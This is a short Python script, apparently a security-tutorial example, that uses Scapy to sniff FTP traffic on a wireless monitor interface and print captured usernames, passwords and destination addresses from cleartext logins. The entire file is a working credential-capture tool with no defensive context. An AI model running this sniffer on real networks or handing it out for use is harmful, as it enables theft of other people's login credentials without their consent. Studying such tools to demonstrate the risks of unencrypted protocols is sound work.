import re
from scapy.all import *


def ftp_sniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?i)USER (.*)', raw)
    pswd = re.findall('(?i)PASS (.*)', raw)
    if user:
        print('[*] Detected FTP login to: ' + str(dest))
        print('[+] User account: ' + str(user[0]))
    elif pswd:
        print('[+] Password: ' + str(pswd[0]))


def main():
    conf.iface = 'mon0'
    try:
        sniff(filter='tcp port 21', prn=ftp_sniff)
    except KeyboardInterrupt:
        exit(0)


if __name__ == '__main__':
    main()



